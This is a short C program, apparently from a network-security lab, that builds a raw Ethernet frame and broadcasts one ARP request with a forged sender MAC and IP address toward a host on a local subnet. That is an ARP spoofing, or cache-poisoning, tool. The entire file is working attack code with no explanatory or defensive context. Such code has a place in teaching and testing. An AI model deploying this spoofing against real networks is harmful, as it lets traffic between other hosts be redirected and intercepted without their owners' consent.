#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h> /* the L2 protocols */
#include <sys/ioctl.h>
#include <net/if.h>
#include <errno.h>

#define PKT_SIZE sizeof(struct ether_header) + sizeof(struct ether_arp)

const char if_name[] = "eth2";
const unsigned char ether_broadcast_addr[]={0xff,0xff,0xff,0xff,0xff,0xff};
const unsigned char ether_source_addr[]={0x12,0x34,0x56,0x78,0x9a,0xbc};
const char *target_ip_string = "192.168.187.130";
const char *source_ip_string = "123.123.123.123";
const int source_port = 80;

int main() {
    int sockfd;
    size_t if_name_len = 0;
    int if_index = 0;
    struct in_addr target_ip_addr={0};
    struct in_addr source_ip_addr={0};

    // Create a raw socket
    if ((sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    // Get the index of NIC interface
    struct ifreq ifr;
    if_name_len = strlen(if_name);
    if(if_name_len < IFNAMSIZ) {
        memcpy(ifr.ifr_name, if_name, if_name_len);
    }else {
        perror("interface name is too long");
        exit(1);
    }
    if(ioctl(sockfd, SIOCGIFINDEX, &ifr) == -1) {
        perror("get interface index error");
        exit(1);
    }
    if_index = ifr.ifr_ifindex;

    // Creat the sockaddr_ll (e.g., eth0)
    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = PF_PACKET;
    addr.sll_protocol = htons(ETH_P_ARP);
    addr.sll_ifindex = if_index;
    addr.sll_halen=ETHER_ADDR_LEN;
    memcpy(addr.sll_addr,ether_broadcast_addr,ETHER_ADDR_LEN);

    struct ether_header *pkt = malloc(PKT_SIZE);
    struct ether_arp *req = (struct ether_arp*)(pkt+1);

    // initialize the ether header
    memcpy(pkt->ether_dhost, ether_broadcast_addr, ETH_ALEN);
    memcpy(pkt->ether_shost, ether_source_addr, ETH_ALEN);
    pkt->ether_type = htons(ETH_P_ARP);

    // Create the ARP packet
    req->arp_hrd = htons(ARPHRD_ETHER);
    req->arp_pro = htons(ETH_P_IP);
    req->arp_hln = ETHER_ADDR_LEN;
    req->arp_pln = sizeof(in_addr_t);
    req->arp_op = htons(ARPOP_REQUEST);

    // Assign the target mac address and ip address
    memset(&req->arp_tha, 0, sizeof(req->arp_tha));
    if(!inet_aton(target_ip_string, &target_ip_addr)) {
        fprintf(stderr, "%s is not a valid IP address", target_ip_string);
        exit(1);
    }
    memcpy(&req->arp_tpa, &target_ip_addr.s_addr, sizeof(req->arp_tpa));

    // Assign the source mac address and ip address
    memcpy(&req->arp_sha, ether_source_addr, sizeof(req->arp_sha));
    if(!inet_aton(source_ip_string, &source_ip_addr)) {
        fprintf(stderr, "%s is not a valid IP address", source_ip_string);
        exit(1);
    }
    memcpy(&req->arp_spa, &source_ip_addr.s_addr, sizeof(req->arp_spa));

    int send_len = sendto(sockfd, pkt, PKT_SIZE, 0, (struct sockaddr*)&addr, sizeof(addr));
    if(send_len == -1) {
        perror("Send packet failed");
        exit(1);
    }

    close(sockfd);
    return 0;
}